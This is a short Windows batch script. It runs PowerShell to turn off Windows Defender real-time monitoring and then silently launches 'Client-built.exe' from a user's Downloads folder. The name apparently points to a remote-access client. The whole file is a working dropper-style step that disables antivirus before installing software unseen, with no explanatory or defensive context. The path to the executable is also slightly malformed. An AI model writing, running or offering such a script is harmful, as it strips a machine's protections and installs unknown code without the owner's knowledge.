@echo off
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
start /wait C:Users\mca1\Downloads\Client-built.exe /S